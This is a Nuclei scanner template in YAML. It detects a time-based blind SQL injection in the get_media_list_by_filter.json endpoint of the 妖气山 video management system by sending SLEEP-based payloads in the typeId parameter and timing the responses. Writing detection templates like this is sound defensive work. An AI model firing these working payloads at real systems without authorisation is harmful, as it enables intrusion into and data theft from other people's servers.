id: yaoqishan-get-media-list-by-filter-json-sqli
info:
  name: "妖气山视频管理系统 get_media_list_by_filter.json 接口 SQL 注入"
  author: ProjectDiscoveryAI
  severity: high
  tags: 妖气山视频管理系统
  description: |
    Detects SQL Injection vulnerability in 妖气山视频管理系统's get_media_list_by_filter.json endpoint.

http:
  - method: GET
    path:
      - '{{BaseURL}}/api/get_media_list_by_filter.json?typeId=1%27+AND+(SELECT+5396+FROM+(SELECT(SLEEP(5)))iVgi)+AND+%27wsMJ%27=%27wsMJ'
      - '{{BaseURL}}/api/get_media_list_by_filter.json?typeId=1%27+AND+(SELECT+5396+FROM+(SELECT(SLEEP(8)))iVgi)+AND+%27wsMJ%27=%27wsMJ'
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "操作成功"
          - '"data":'
        part: body
      - type: word
        words:
          - "application/json"
        part: header
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
      - type: status
        status:
          - 200
